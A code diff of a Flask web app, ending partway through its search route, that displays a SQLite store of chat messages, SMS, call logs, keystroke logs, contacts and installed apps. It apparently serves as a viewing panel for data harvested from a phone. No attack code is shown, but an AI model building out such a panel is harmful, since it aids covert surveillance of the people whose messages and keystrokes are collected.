@@ -1,8 +1,9 @@
 from flask import Flask, render_template, send_from_directory, request, jsonify
 import sqlite3
+import os
 import logging
 
-# Configure logging
+# Set up logging
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
@@ -15,125 +16,125 @@ app = Flask(__name__,
 # Database configuration
 DATABASE = 'data.db'
 
-def get_db():
+def get_db_connection():
     try:
         conn = sqlite3.connect(DATABASE)
-        conn.row_factory = sqlite3.Row
+        conn.row_factory = sqlite3.Row  # Access columns by name
+        # Verify connection by executing a test query
+        cursor = conn.cursor()
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+        tables = cursor.fetchall()
+        logger.info(f"Connected to database. Available tables: {[table[0] for table in tables]}")
         return conn
     except sqlite3.Error as e:
         logger.error(f"Database error: {e}")
         return None
 
-# Main menu route
 @app.route('/')
 def index():
-    conn = get_db()
-    if not conn:
-        return "Database connection error", 500
-    
-    try:
-        contacts = conn.execute('''
-            SELECT DISTINCT name FROM (
-                SELECT sender AS name FROM ChatMessages 
-                UNION 
-                SELECT from_to AS name FROM SMS
-            ) ORDER BY name
-        ''').fetchall()
-        conn.close()
-        return render_template('main_menu.html', contacts=contacts)
-    except sqlite3.Error as e:
-        logger.error(f"Database error: {e}")
-        return "Error fetching contacts", 500
+    conn = get_db_connection()
+    if conn:
+        try:
+            contacts = conn.execute('''
+                SELECT DISTINCT sender AS name FROM ChatMessages 
+                UNION SELECT DISTINCT from_to AS name FROM SMS
+            ''').fetchall()
+            conn.close()
+            return render_template('main_menu.html', contacts=contacts)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching contacts", 500
+    return "Database connection error", 500
 
-# Chat route
 @app.route('/chat/<name>')
 def chat(name):
-    conn = get_db()
-    if not conn:
-        return "Database connection error", 500
-    
-    try:
-        messages = conn.execute(
-            'SELECT * FROM ChatMessages WHERE sender = ? ORDER BY time DESC LIMIT 50',
-            (name,)
-        ).fetchall()
-        conn.close()
-        return render_template('chat.html', name=name, messages=messages)
-    except sqlite3.Error as e:
-        logger.error(f"Database error: {e}")
-        return "Error fetching messages", 500
+    conn = get_db_connection()
+    if conn:
+        try:
+            messages = conn.execute(
+                'SELECT * FROM ChatMessages WHERE sender = ? ORDER BY time', (name,)
+            ).fetchall()
+            conn.close()
+            return render_template('chat.html', name=name, messages=messages)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching messages", 500
+    return "Database connection error", 500
 
-# SMS route
 @app.route('/sms/<name>')
 def sms_thread(name):
-    conn = get_db()
-    if not conn:
-        return "Database connection error", 500
-    
-    try:
-        messages = conn.execute(
-            'SELECT * FROM SMS WHERE from_to = ? ORDER BY time DESC LIMIT 50',
-            (name,)
-        ).fetchall()
-        conn.close()
-        return render_template('sms.html', name=name, sms_messages=messages)
-    except sqlite3.Error as e:
-        logger.error(f"Database error: {e}")
-        return "Error fetching messages", 500
+    conn = get_db_connection()
+    if conn:
+        try:
+            sms_messages = conn.execute(
+                'SELECT * FROM SMS WHERE from_to = ? ORDER BY time', (name,)
+            ).fetchall()
+            conn.close()
+            return render_template('sms.html', name=name, sms_messages=sms_messages)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching SMS", 500
+    return "Database connection error", 500
 
-# Calls route
 @app.route('/calls')
 def calls():
-    conn = get_db()
-    if not conn:
-        return "Database connection error", 500
-    
-    try:
-        call_logs = conn.execute('SELECT * FROM Calls ORDER BY time DESC LIMIT 50').fetchall()
-        conn.close()
-        return render_template('calls.html', call_logs=call_logs)
-    except sqlite3.Error as e:
-        logger.error(f"Database error: {e}")
-        return "Error fetching call logs", 500
+    conn = get_db_connection()
+    if conn:
+        try:
+            call_logs = conn.execute('SELECT * FROM Calls ORDER BY time DESC').fetchall()
+            conn.close()
+            return render_template('calls.html', call_logs=call_logs)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching calls", 500
+    return "Database connection error", 500
 
-# Keylogs route
 @app.route('/keylogs')
 def keylogs():
-    conn = get_db()
-    if not conn:
-        return "Database connection error", 500
-    
-    try:
-        keylog_data = conn.execute('SELECT * FROM Keylogs ORDER BY time DESC LIMIT 50').fetchall()
-        conn.close()
-        return render_template('keylogs.html', keylogs=keylog_data)
-    except sqlite3.Error as e:
-        logger.error(f"Database error: {e}")
-        return "Error fetching keylogs", 500
+    conn = get_db_connection()
+    if conn:
+        try:
+            keylog_data = conn.execute('SELECT * FROM Keylogs ORDER BY time DESC').fetchall()
+            conn.close()
+            return render_template('keylogs.html', keylogs=keylog_data)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching keylogs", 500
+    return "Database connection error", 500
 
-# Contacts route
+@app.route('/installed_apps')
+def installed_apps():
+    conn = get_db_connection()
+    if conn:
+        try:
+            app_data = conn.execute('SELECT * FROM InstalledApps ORDER BY application_name').fetchall()
+            conn.close()
+            return render_template('installed_apps.html', installed_apps=app_data)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching installed apps", 500
+    return "Database connection error", 500
+
 @app.route('/contacts')
 def contacts_list():
-    conn = get_db()
-    if not conn:
-        return "Database connection error", 500
-    
-    try:
-        contact_data = conn.execute('SELECT * FROM Contacts ORDER BY name').fetchall()
-        conn.close()
-        return render_template('contacts.html', contacts=contact_data)
-    except sqlite3.Error as e:
-        logger.error(f"Database error: {e}")
-        return "Error fetching contacts", 500
+    conn = get_db_connection()
+    if conn:
+        try:
+            contacts = conn.execute('SELECT * FROM Contacts ORDER BY name').fetchall()
+            conn.close()
+            return render_template('contacts.html', contacts=contacts)
+        except sqlite3.Error as e:
+            logger.error(f"Database error: {e}")
+            return "Error fetching contacts", 500
+    return "Database connection error", 500
 
-# Search functionality
 @app.route('/search', methods=['POST'])
 def search():
     search_term = request.form.get('search_term')
     if not search_term:
         return jsonify({'error': 'Search term required'}), 400
 
-    conn = get_db()
+    conn = get_db_connection()
     if not conn:
         return jsonify({'error': 'Database connection error'}), 500
 
